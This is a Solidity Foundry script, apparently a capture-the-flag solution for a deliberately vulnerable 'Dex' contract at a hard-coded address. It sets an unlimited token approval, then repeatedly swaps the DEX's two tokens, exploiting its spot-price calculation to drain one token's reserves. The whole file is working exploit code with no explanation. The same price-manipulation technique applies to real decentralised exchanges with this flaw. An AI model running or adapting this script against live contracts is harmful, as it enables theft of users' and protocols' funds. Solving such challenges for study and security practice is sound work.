// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface IDex {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract SolveDex is Script {

    function run() external {

        address target = 0x6d83669068569345D4b4850619ca749032426a90;
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        IDex dex = IDex(target);

        address token1 = dex.token1();
        address token2 = dex.token2();

        // 🔥 approve illimité
        dex.approve(address(dex), type(uint256).max);

        // 🔁 loop principale
        while (
            IERC20(token1).balanceOf(target) > 0 &&
            IERC20(token2).balanceOf(target) > 0
        ) {

            uint bal1 = IERC20(token1).balanceOf(vm.addr(privateKey));
            uint bal2 = IERC20(token2).balanceOf(vm.addr(privateKey));

            if (bal1 > 0) {
                uint dexFrom = IERC20(token1).balanceOf(target);
                uint dexTo = IERC20(token2).balanceOf(target);

                uint amount = bal1;

                uint swapAmount = (amount * dexTo) / dexFrom;

                if (swapAmount > dexTo) {
                    amount = (dexTo * dexFrom) / dexTo;
                }

                dex.swap(token1, token2, amount);

            } else {
                uint dexFrom = IERC20(token2).balanceOf(target);
                uint dexTo = IERC20(token1).balanceOf(target);

                uint amount = bal2;

                uint swapAmount = (amount * dexTo) / dexFrom;

                if (swapAmount > dexTo) {
                    amount = (dexTo * dexFrom) / dexTo;
                }

                dex.swap(token2, token1, amount);
            }
                    }

                    vm.stopBroadcast();
                }
            }